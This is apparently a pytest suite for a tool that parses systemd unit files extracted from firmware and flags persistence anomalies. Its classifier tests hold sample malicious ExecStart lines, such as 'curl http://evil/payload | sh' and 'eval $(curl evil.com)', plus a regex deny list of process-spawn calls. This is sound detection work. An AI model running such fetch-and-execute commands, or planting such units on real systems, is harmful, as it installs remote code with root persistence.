"""Tests for the Phase ι.B.C Linux systemd unit-file walker triplet.

Rule #35b live canary — exercises the inner orchestrator
(``_do_systemd_walk``) against a real test DB via ``make_live_db()``
with a synthetic on-disk systemd tree.

Covers:
- Manual INI parser (parse_systemd_unit_text) — multi-value keys,
  duplicate keys, comments, sections.
- Unit-file extension classifier (has_unit_extension).
- Type/name splitting (get_unit_type_and_name).
- Filesystem walker (walk_systemd_unit_paths) — discovers files
  under canonical dirs, skips drop-in dirs, skips symlinks.
- Drop-in override discovery (find_dropin_files).
- Enabled-symlink discovery (find_enabled_symlinks).
- Anomaly classifier — suspicious_path / suspicious_unit_name /
  socket_unusual_port / root_minimal_deps / disabled_but_present /
  enabled_outside_standard / obfuscated_exec.
- Drop-in merge behavior (assemble_unit_row).
- Inner orchestrator end-to-end via Rule #35b live canary —
  LinuxSystemdUnit rows persist with correct field mapping.
- Rule #36 no-execute test gate — the source file does not invoke
  any spawn primitive.
"""
from __future__ import annotations

import pathlib
import re

import pytest
from sqlalchemy import select

from app.models import Firmware, LinuxSystemdUnit, Project
from app.services.systemd_walker import (
    _do_systemd_walk,
    _extract_port,
    _is_obfuscated_exec,
    _is_root_minimal_deps,
    _is_suspicious_path,
    _is_suspicious_unit_name,
    _socket_has_unusual_port,
    assemble_unit_row,
    build_anomaly_flags,
    find_dropin_files,
    find_enabled_symlinks,
    get_unit_type_and_name,
    has_unit_extension,
    parse_systemd_unit_text,
    walk_systemd_unit_paths,
)
from tests._live_db import make_live_db

# ── INI parser tests ─────────────────────────────────────────────────────────


def test_parse_systemd_unit_text_basic_sections():
    text = """[Unit]
Description=OpenSSH server

[Service]
ExecStart=/usr/sbin/sshd -D
User=sshd

[Install]
WantedBy=multi-user.target
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Unit"]["Description"] == "OpenSSH server"
    assert sections["Service"]["ExecStart"] == "/usr/sbin/sshd -D"
    assert sections["Service"]["User"] == "sshd"
    assert sections["Install"]["WantedBy"] == ["multi-user.target"]


def test_parse_systemd_unit_text_skips_comments():
    text = """# Comment line
[Unit]
; another comment
Description=Foo

[Service]
ExecStart=/bin/true
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Unit"]["Description"] == "Foo"


def test_parse_systemd_unit_text_multivalue_space_separated():
    text = """[Install]
WantedBy=multi-user.target graphical.target
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Install"]["WantedBy"] == [
        "multi-user.target",
        "graphical.target",
    ]


def test_parse_systemd_unit_text_multivalue_repeated_lines():
    """systemd allows duplicate keys to ACCUMULATE for list-shape keys."""
    text = """[Unit]
After=net.target
After=auditd.service
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Unit"]["After"] == ["net.target", "auditd.service"]


def test_parse_systemd_unit_text_scalar_last_write_wins():
    """For non-list keys, last directive overrides."""
    text = """[Service]
ExecStart=/bin/first
ExecStart=/bin/second
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Service"]["ExecStart"] == "/bin/second"


def test_parse_systemd_unit_text_empty_value():
    text = """[Service]
EnvironmentFile=
ExecStart=/bin/true
"""
    sections = parse_systemd_unit_text(text)
    assert sections["Service"]["EnvironmentFile"] == ""


def test_parse_systemd_unit_text_continuation_line():
    text = """[Service]
ExecStart=/bin/sh -c \\
'echo hello'
"""
    sections = parse_systemd_unit_text(text)
    # Continuation merges: "/bin/sh -c 'echo hello'"
    assert "echo hello" in sections["Service"]["ExecStart"]


def test_parse_systemd_unit_text_malformed_no_crash():
    """Malformed input should not crash the parser."""
    text = "random gibberish no sections here\n\n=invalid=\n"
    sections = parse_systemd_unit_text(text)
    assert sections == {}


# ── Extension + name tests ───────────────────────────────────────────────────


@pytest.mark.parametrize("name,expected", [
    ("sshd.service", True),
    ("backup.timer", True),
    ("dbus.socket", True),
    ("graphical.target", True),
    ("readme.txt", False),
    ("sshd.service.d", False),  # drop-in dir, not a file
    ("foo.bar", False),
])
def test_has_unit_extension(name, expected):
    assert has_unit_extension(name) == expected


@pytest.mark.parametrize("path,expected_type,expected_name", [
    ("/etc/systemd/system/sshd.service", "service", "sshd"),
    ("/usr/lib/systemd/system/cron.timer", "timer", "cron"),
    ("/run/systemd/system/dbus.socket", "socket", "dbus"),
    ("/etc/systemd/system/multi-user.target", "target", "multi-user"),
])
def test_get_unit_type_and_name(path, expected_type, expected_name):
    t, n = get_unit_type_and_name(path)
    assert t == expected_type
    assert n == expected_name


# ── Anomaly classifier tests ─────────────────────────────────────────────────


def test_is_suspicious_path_tmp():
    assert _is_suspicious_path("/tmp/backdoor")
    assert _is_suspicious_path("/usr/bin/sh /tmp/payload.sh")


def test_is_suspicious_path_dev_shm():
    assert _is_suspicious_path("/dev/shm/foo")


def test_is_suspicious_path_home():
    assert _is_suspicious_path("/home/user/.cache/evil")


def test_is_suspicious_path_legitimate_returns_false():
    assert not _is_suspicious_path("/usr/sbin/sshd")
    assert not _is_suspicious_path("/usr/bin/cron")
    assert not _is_suspicious_path(None)
    assert not _is_suspicious_path("")


def test_is_suspicious_unit_name_hex():
    assert _is_suspicious_unit_name("abcdef12")
    assert _is_suspicious_unit_name("abc12345def")


def test_is_suspicious_unit_name_legitimate():
    assert not _is_suspicious_unit_name("sshd")
    assert not _is_suspicious_unit_name("network-manager")
    assert not _is_suspicious_unit_name(None)
    assert not _is_suspicious_unit_name("")


def test_is_obfuscated_exec_long_shell_c():
    # Body after "-c " must exceed 120 chars to trigger the regex.
    long_cmd = (
        "/bin/sh -c 'for i in $(seq 1 100); do echo iteration $i with "
        "more text here to exceed one hundred and twenty characters in "
        "total length easily'"
    )
    assert _is_obfuscated_exec(long_cmd)


def test_is_obfuscated_exec_eval_pattern():
    assert _is_obfuscated_exec("eval $(cat /tmp/payload.sh)")
    assert _is_obfuscated_exec("/bin/sh -c 'base64 -d <<<...'")


def test_is_obfuscated_exec_curl_pipe_sh():
    assert _is_obfuscated_exec(
        "/bin/sh -c 'curl http://evil/payload | sh'"
    )


def test_is_obfuscated_exec_base64_blob():
    # A genuine base64 blob — 60+ chars; should decode validly.
    import base64
    blob = base64.b64encode(b"x" * 50).decode()
    assert _is_obfuscated_exec(f"/bin/sh -c 'echo {blob}'")


def test_is_obfuscated_exec_legitimate():
    assert not _is_obfuscated_exec("/usr/sbin/sshd -D")
    assert not _is_obfuscated_exec("/bin/true")
    assert not _is_obfuscated_exec(None)
    assert not _is_obfuscated_exec("")


def test_extract_port_simple():
    assert _extract_port("80") == 80
    assert _extract_port("443") == 443


def test_extract_port_host_port():
    assert _extract_port("127.0.0.1:8080") == 8080
    assert _extract_port("0.0.0.0:443") == 443


def test_extract_port_ipv6():
    assert _extract_port("[::]:443") == 443


def test_extract_port_path_returns_none():
    assert _extract_port("/run/foo.sock") is None


def test_extract_port_invalid_returns_none():
    assert _extract_port("") is None
    assert _extract_port("not a port") is None


def test_socket_has_unusual_port_well_known():
    assert not _socket_has_unusual_port({"ListenStream": "80"})
    assert not _socket_has_unusual_port({"ListenStream": "443"})


def test_socket_has_unusual_port_unusual():
    assert _socket_has_unusual_port({"ListenStream": "31337"})
    assert _socket_has_unusual_port({"ListenDatagram": "12345"})


def test_socket_has_unusual_port_path_not_flagged():
    """Socket paths (not numeric ports) should not flag."""
    assert not _socket_has_unusual_port({"ListenStream": "/run/x.sock"})


def test_is_root_minimal_deps_root_no_requires():
    assert _is_root_minimal_deps(None, None)
    assert _is_root_minimal_deps(None, [])
    assert _is_root_minimal_deps("root", [])
    assert _is_root_minimal_deps("0", None)


def test_is_root_minimal_deps_root_with_requires_false():
    assert not _is_root_minimal_deps(None, ["network.target"])


def test_is_root_minimal_deps_non_root_false():
    assert not _is_root_minimal_deps("nobody", None)
    assert not _is_root_minimal_deps("daemon", [])


def test_build_anomaly_flags_clean_unit():
    flags = build_anomaly_flags(
        exec_start="/usr/sbin/sshd -D",
        working_directory=None,
        user="sshd",
        unit_name="sshd",
        unit_type="service",
        wanted_by=["multi-user.target"],
        required_by=None,
        requires=["network.target"],
        socket_listen=None,
        enabled=True,
    )
    assert flags["suspicious_path"] is False
    assert flags["suspicious_unit_name"] is False
    assert flags["socket_unusual_port"] is False
    assert flags["root_minimal_deps"] is False
    assert flags["disabled_but_present"] is False
    assert flags["enabled_outside_standard"] is False
    assert flags["obfuscated_exec"] is False


def test_build_anomaly_flags_writable_payload():
    flags = build_anomaly_flags(
        exec_start="/tmp/backdoor.sh",
        working_directory=None,
        user="root",
        unit_name="abcdef12",
        unit_type="service",
        wanted_by=["multi-user.target"],
        required_by=None,
        requires=None,
        socket_listen=None,
        enabled=True,
    )
    assert flags["suspicious_path"] is True
    assert flags["suspicious_unit_name"] is True
    assert flags["root_minimal_deps"] is True


def test_build_anomaly_flags_disabled_but_present_service():
    flags = build_anomaly_flags(
        exec_start="/bin/true",
        working_directory=None,
        user="nobody",
        unit_name="leftover",
        unit_type="service",
        wanted_by=None,
        required_by=None,
        requires=["network.target"],
        socket_listen=None,
        enabled=False,
    )
    assert flags["disabled_but_present"] is True


def test_build_anomaly_flags_disabled_but_present_skipped_for_target():
    """Targets aren't usually enabled — don't flag them as
    disabled_but_present."""
    flags = build_anomaly_flags(
        exec_start=None,
        working_directory=None,
        user=None,
        unit_name="multi-user",
        unit_type="target",
        wanted_by=None,
        required_by=None,
        requires=None,
        socket_listen=None,
        enabled=False,
    )
    assert flags["disabled_but_present"] is False


def test_build_anomaly_flags_enabled_outside_standard():
    flags = build_anomaly_flags(
        exec_start="/bin/true",
        working_directory=None,
        user="nobody",
        unit_name="foo",
        unit_type="service",
        wanted_by=["custom-attacker.target"],
        required_by=None,
        requires=["network.target"],
        socket_listen=None,
        enabled=True,
    )
    assert flags["enabled_outside_standard"] is True


def test_build_anomaly_flags_obfuscated_exec_eval():
    flags = build_anomaly_flags(
        exec_start="/bin/sh -c 'eval $(curl evil.com)'",
        working_directory=None,
        user="root",
        unit_name="dropper",
        unit_type="service",
        wanted_by=["multi-user.target"],
        required_by=None,
        requires=["network.target"],
        socket_listen=None,
        enabled=True,
    )
    assert flags["obfuscated_exec"] is True


# ── Filesystem walker tests ──────────────────────────────────────────────────


def test_walk_systemd_unit_paths_finds_units(tmp_path):
    """Walker should find unit files under canonical systemd dirs."""
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    (sysdir / "sshd.service").write_text("[Unit]\nDescription=SSH\n")
    (sysdir / "cron.timer").write_text("[Unit]\nDescription=Cron\n")
    (sysdir / "readme.txt").write_text("not a unit")

    hits = walk_systemd_unit_paths([str(tmp_path)])
    names = {pathlib.Path(h).name for h in hits}
    assert "sshd.service" in names
    assert "cron.timer" in names
    assert "readme.txt" not in names


def test_walk_systemd_unit_paths_skips_dropin_dirs(tmp_path):
    """Drop-in subdirectories should not be recursed into."""
    sysdir = tmp_path / "etc" / "systemd" / "system"
    dropin = sysdir / "sshd.service.d"
    dropin.mkdir(parents=True)
    (sysdir / "sshd.service").write_text("[Unit]\n")
    (dropin / "override.conf").write_text("[Service]\n")

    hits = walk_systemd_unit_paths([str(tmp_path)])
    names = {pathlib.Path(h).name for h in hits}
    assert "sshd.service" in names
    # The override.conf inside the drop-in dir is NOT a unit file by
    # extension, so it shouldn't appear anyway, but the drop-in dir
    # itself was excluded from descent.
    assert "override.conf" not in names


def test_walk_systemd_unit_paths_skips_symlinks(tmp_path):
    """Symlinks (typically enabled-symlinks under *.wants/) should be
    skipped to avoid duplicate persistence."""
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    real_unit = sysdir / "sshd.service"
    real_unit.write_text("[Unit]\n")
    wants_dir = sysdir / "multi-user.target.wants"
    wants_dir.mkdir()
    symlink = wants_dir / "sshd.service"
    symlink.symlink_to(real_unit)

    hits = walk_systemd_unit_paths([str(tmp_path)])
    real_paths = [pathlib.Path(h).resolve() for h in hits]
    # One real entry only — the symlink should be skipped.
    assert sum(1 for p in real_paths if p.name == "sshd.service") == 1


def test_walk_systemd_unit_paths_missing_root_returns_empty():
    assert walk_systemd_unit_paths(["/this/does/not/exist"]) == []


def test_walk_systemd_unit_paths_empty_root(tmp_path):
    assert walk_systemd_unit_paths([str(tmp_path)]) == []


def test_find_dropin_files(tmp_path):
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    unit = sysdir / "sshd.service"
    unit.write_text("[Unit]\n")
    dropin = sysdir / "sshd.service.d"
    dropin.mkdir()
    (dropin / "10-override.conf").write_text("a")
    (dropin / "20-second.conf").write_text("b")
    (dropin / "not-a-conf.txt").write_text("ignored")

    paths = find_dropin_files(str(unit))
    names = [pathlib.Path(p).name for p in paths]
    assert names == ["10-override.conf", "20-second.conf"]


def test_find_dropin_files_no_dropin_dir(tmp_path):
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    unit = sysdir / "sshd.service"
    unit.write_text("[Unit]\n")
    assert find_dropin_files(str(unit)) == []


def test_find_enabled_symlinks(tmp_path):
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    real_unit = sysdir / "sshd.service"
    real_unit.write_text("[Unit]\n")
    wants_dir = sysdir / "multi-user.target.wants"
    wants_dir.mkdir()
    (wants_dir / "sshd.service").symlink_to(real_unit)
    requires_dir = sysdir / "graphical.target.requires"
    requires_dir.mkdir()
    (requires_dir / "sshd.service").symlink_to(real_unit)

    symlinks = find_enabled_symlinks([str(tmp_path)], "sshd.service")
    assert len(symlinks) == 2


def test_find_enabled_symlinks_no_matches(tmp_path):
    assert find_enabled_symlinks([str(tmp_path)], "ghost.service") == []


# ── Drop-in merge test ───────────────────────────────────────────────────────


def test_assemble_unit_row_dropin_overrides_exec_start(tmp_path):
    """A drop-in override that re-declares ExecStart= should win over
    the main unit's declaration."""
    import uuid
    main_text = """[Unit]
Description=Foo

[Service]
ExecStart=/bin/original
User=nobody
"""
    dropin_text = """[Service]
ExecStart=/tmp/overridden.sh
"""
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text=main_text,
        enabled_symlinks=[],
        dropin_texts=[dropin_text],
    )
    assert row.exec_start == "/tmp/overridden.sh"
    # Anomaly bit fires because ExecStart now points under /tmp/.
    assert (row.anomaly_flags or {}).get("suspicious_path") is True


def test_assemble_unit_row_dropin_accumulates_after(tmp_path):
    """Drop-in After= adds to the parent's After= list."""
    import uuid
    main_text = """[Unit]
After=network.target
"""
    dropin_text = """[Unit]
After=auditd.service
"""
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text=main_text,
        enabled_symlinks=[],
        dropin_texts=[dropin_text],
    )
    after_list = list(row.after or [])
    assert "network.target" in after_list
    assert "auditd.service" in after_list


def test_assemble_unit_row_enabled_when_symlink_present():
    import uuid
    text = "[Unit]\n[Service]\nExecStart=/bin/true\n"
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text=text,
        enabled_symlinks=["/etc/systemd/system/multi-user.target.wants/foo.service"],
        dropin_texts=[],
    )
    assert row.enabled is True


def test_assemble_unit_row_disabled_when_no_symlink():
    import uuid
    text = "[Unit]\n[Service]\nExecStart=/bin/true\n"
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text=text,
        enabled_symlinks=[],
        dropin_texts=[],
    )
    assert row.enabled is False


def test_assemble_unit_row_anomaly_flags_stamped():
    """Anomaly flags should always be stamped with schema_version=1."""
    import uuid
    text = "[Service]\nExecStart=/bin/true\n"
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text=text,
        enabled_symlinks=[],
        dropin_texts=[],
    )
    assert (row.anomaly_flags or {}).get("schema_version") == 1


def test_assemble_unit_row_malformed_no_crash():
    """Malformed INI text should produce a row with empty fields, not
    raise."""
    import uuid
    row = assemble_unit_row(
        firmware_id=uuid.uuid4(),
        unit_path="/etc/systemd/system/foo.service",
        text="random garbage no sections here",
        enabled_symlinks=[],
        dropin_texts=[],
    )
    assert row.unit_name == "foo"
    assert row.unit_type == "service"


# ── Rule #35b live canary — end-to-end against real ORM/DB ──────────────────


@pytest.mark.asyncio
async def test_do_systemd_walk_persists_units(tmp_path):
    """Rule #35b live canary — _do_systemd_walk persists real
    LinuxSystemdUnit rows against an ORM-backed test session with all
    field mappings correctly applied.
    """
    sysdir = tmp_path / "etc" / "systemd" / "system"
    sysdir.mkdir(parents=True)
    (sysdir / "sshd.service").write_text("""[Unit]
Description=OpenSSH server
After=network.target

[Service]
ExecStart=/usr/sbin/sshd -D
User=sshd
WorkingDirectory=/var/lib/sshd

[Install]
WantedBy=multi-user.target
""")
    # Suspicious unit — ExecStart under /tmp/, root, no deps.
    (sysdir / "abcdef12.service").write_text("""[Unit]
Description=Suspicious

[Service]
ExecStart=/tmp/payload.sh
User=root
""")
    # Enable the suspicious one.
    wants_dir = sysdir / "multi-user.target.wants"
    wants_dir.mkdir()
    (wants_dir / "abcdef12.service").symlink_to(sysdir / "abcdef12.service")

    async with make_live_db() as db:
        project = Project(name="test-iota-b", description="ι.B.C live canary")
        db.add(project)
        await db.flush()

        firmware = Firmware(
            project_id=project.id,
            original_filename="test.bin",
            storage_path="/tmp/x",
            file_size=100,
            sha256="0" * 64,
            extracted_path=str(tmp_path),
        )
        db.add(firmware)
        await db.flush()

        result = await _do_systemd_walk(db, firmware.id)
        await db.commit()

    # Verify aggregate.
    assert result["units_scanned"] == 2
    assert result["units_persisted"] == 2
    assert result["service_count"] == 2
    assert result["enabled_count"] >= 1  # abcdef12 has the symlink
    # Suspicious unit fires multiple anomaly bits.
    assert result["suspicious_path_count"] >= 1
    assert result["suspicious_unit_name_count"] >= 1
    assert result["root_minimal_deps_count"] >= 1
    assert result["anomaly_total"] >= 1

    # Verify per-row persistence via a fresh session.
    async with make_live_db() as db2:
        project = Project(name="t2", description="select check")
        db2.add(project)
        await db2.flush()

        firmware = Firmware(
            project_id=project.id,
            original_filename="t2.bin",
            storage_path="/tmp/y",
            file_size=200,
            sha256="1" * 64,
            extracted_path=str(tmp_path),
        )
        db2.add(firmware)
        await db2.flush()

        await _do_systemd_walk(db2, firmware.id)
        await db2.commit()

        # Find the suspicious unit row.
        rows = (await db2.execute(
            select(LinuxSystemdUnit).where(
                LinuxSystemdUnit.firmware_id == firmware.id,
                LinuxSystemdUnit.unit_name == "abcdef12",
            )
        )).scalars().all()
        assert len(rows) == 1
        susp = rows[0]
        assert susp.exec_start == "/tmp/payload.sh"
        assert susp.user == "root"
        assert susp.unit_type == "service"
        assert susp.enabled is True
        assert susp.anomaly_flags["schema_version"] == 1
        assert susp.anomaly_flags["suspicious_path"] is True
        assert susp.anomaly_flags["suspicious_unit_name"] is True
        assert susp.anomaly_flags["root_minimal_deps"] is True


@pytest.mark.asyncio
async def test_do_systemd_walk_empty_returns_empty_aggregate(tmp_path):
    """When no unit files exist, the walker returns the empty
    aggregate without raising."""
    async with make_live_db() as db:
        project = Project(name="empty", description="empty case")
        db.add(project)
        await db.flush()

        firmware = Firmware(
            project_id=project.id,
            original_filename="empty.bin",
            storage_path="/tmp/empty",
            file_size=0,
            sha256="0" * 64,
            extracted_path=str(tmp_path),
        )
        db.add(firmware)
        await db.flush()

        result = await _do_systemd_walk(db, firmware.id)
        assert result["units_scanned"] == 0
        assert result["units_persisted"] == 0
        assert result["anomaly_total"] == 0


# ── Rule #36 no-execute test gate ────────────────────────────────────────────


def test_systemd_walker_no_execute():
    """Rule #36 — the systemd_walker.py source MUST NOT invoke any
    spawn primitive against extracted artefacts. The walker is a
    pure-Python INI parser; nothing should execute the parsed data.
    """
    source = (
        pathlib.Path(__file__).parent.parent
        / "app"
        / "services"
        / "systemd_walker.py"
    ).read_text()
    forbidden_patterns = (
        r"subprocess\.(run|Popen|call|check_output|check_call)",
        r"asyncio\.create_subprocess_(exec|shell)",
        r"os\.(system|execvp|execve|spawnvp)",
        r"\brunpy\.run_path\b",
        r"\beval\s*\(",
        r"\bexec\s*\([\"\']",
    )
    for pattern in forbidden_patterns:
        matches = re.findall(pattern, source)
        assert not matches, (
            f"Rule #36 violation in systemd_walker.py — found "
            f"{matches} matching {pattern!r}; the walker MUST NOT "
            "invoke spawn primitives against extracted artefacts."
        )
